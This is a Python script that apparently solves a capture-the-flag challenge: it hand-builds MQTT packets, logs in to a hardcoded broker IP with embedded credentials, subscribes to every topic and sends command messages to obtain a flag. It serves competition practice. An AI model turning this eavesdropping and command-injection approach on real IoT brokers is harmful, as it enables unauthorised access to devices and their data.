import socket
import struct
import time
import random
import string
import json

def mqtt_connect(client_id, username=None, password=None):
    flags = 0x02
    if username: flags |= 0x80
    if password: flags |= 0x40
    var_header = b'\x00\x04MQTT\x04' + bytes([flags]) + b'\x00\x3c'
    payload = struct.pack("!H", len(client_id)) + client_id.encode()
    if username:
        payload += struct.pack("!H", len(username)) + username.encode()
    if password:
        payload += struct.pack("!H", len(password)) + password.encode()
    rem_len = len(var_header) + len(payload)
    fixed_header = b'\x10' + bytes([rem_len]) 
    return fixed_header + var_header + payload

def mqtt_subscribe(topic, packet_id):
    var_header = struct.pack("!H", packet_id)
    payload = struct.pack("!H", len(topic)) + topic.encode() + b'\x00'
    rem_len = len(var_header) + len(payload)
    fixed_header = b'\x82' + bytes([rem_len])
    return fixed_header + var_header + payload

def mqtt_publish(topic, message):
    # Fixed Label: 0x30 (Publish, QoS 0)
    topic_len = struct.pack("!H", len(topic))
    payload = message.encode()
    rem_len = len(topic_len) + len(topic) + len(payload)
    fixed_header = b'\x30'
    # encode remaining length (can be multi-byte)
    if rem_len < 128:
        fixed_header += bytes([rem_len])
    else:
        # Simple encode for > 127
        fixed_header += bytes([(rem_len & 0x7F) | 0x80, rem_len >> 7])
    
    return fixed_header + topic_len + topic.encode() + payload

def solve():
    server = "51.210.244.18"
    port = 1883
    user = "hackday"
    pwd = "1Bc2Mk0rlevzuCG6AaDK6Opa"
    
    s = socket.create_connection((server, port), timeout=10)
    s.sendall(mqtt_connect("solver-client-" + ''.join(random.choices(string.ascii_lowercase, k=5)), user, pwd))
    connack = s.recv(4)
    print(f"[*] Connack: {connack.hex()}")
    
    # Subscribe to responses
    s.sendall(mqtt_subscribe("response/#", 1001))
    s.sendall(mqtt_subscribe("#", 1002))
    
    # Send help command
    resp_topic = "response/my_unique_id"
    cmd = json.dumps({"cmd": "help", "response_topic": resp_topic})
    print(f"[*] Sending help command to ctf/hackday")
    s.sendall(mqtt_publish("ctf/hackday", cmd))
    
    # Send flag command
    cmd_flag = json.dumps({"cmd": "flag", "response_topic": resp_topic})
    print(f"[*] Sending flag command to ctf/hackday")
    s.sendall(mqtt_publish("ctf/hackday", cmd_flag))

    try:
        while True:
            data = s.recv(4096)
            if not data: break
            print(f"[*] Received: {data.hex()}")
            try:
                print(f"[*] Text: {data.decode(errors='ignore')}")
                if "HACKDAY{" in data.decode(errors='ignore'):
                    print("[!!!] POSSIBLE FLAG FOUND [!!!]")
            except: pass
    except: pass
    finally:
        s.close()

if __name__ == "__main__":
    solve()
